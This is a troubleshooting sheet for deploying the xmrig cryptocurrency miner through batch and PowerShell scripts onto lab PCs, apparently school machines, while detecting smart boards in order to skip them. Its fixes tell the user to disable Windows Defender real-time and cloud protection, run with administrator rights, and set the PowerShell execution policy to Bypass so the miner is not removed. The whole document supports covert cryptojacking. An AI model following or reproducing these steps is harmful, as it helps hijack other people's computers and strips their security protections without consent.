══════════════════════════════════════════════════════════════
                  COMMON CAUSES & FIXES
══════════════════════════════════════════════════════════════

ISSUE 1: Windows Defender Blocks Immediately
────────────────────────────────────────────────────────────
Symptom: Window closes, no errors shown, xmrig.exe deleted

Fix:
1. Open Windows Security
2. Virus & threat protection
3. Manage settings
4. Turn OFF "Real-time protection"
5. Turn OFF "Cloud-delivered protection"
6. Run START_HERE.bat again


ISSUE 2: Not Running as Administrator
────────────────────────────────────────────────────────────
Symptom: "Access Denied" or "Admin rights required"

Fix:
1. RIGHT-CLICK on START_HERE.bat
2. Select "Run as administrator"
3. Click Yes on UAC prompt


ISSUE 3: Files Missing
────────────────────────────────────────────────────────────
Symptom: "File not found" error

Fix:
Make sure these files are in the SAME folder:
✅ 🚀_START_HERE.bat
✅ DEPLOY_ULTIMATE.ps1
✅ xmrig.exe
✅ AUTO_DETECT_DEVICE_TYPE.ps1


ISSUE 4: PowerShell Execution Policy
────────────────────────────────────────────────────────────
Symptom: "Scripts are disabled on this system"

Fix:
1. Open PowerShell as Admin
2. Run: Set-ExecutionPolicy Bypass -Force
3. Run START_HERE.bat again


ISSUE 5: Smart Board Detection Aborted Deployment
────────────────────────────────────────────────────────────
Symptom: Shows "SMART BOARD DETECTED - ABORTING"

Fix:
This is actually GOOD - it means you're testing on a smart board!
→ Test on a regular lab PC instead
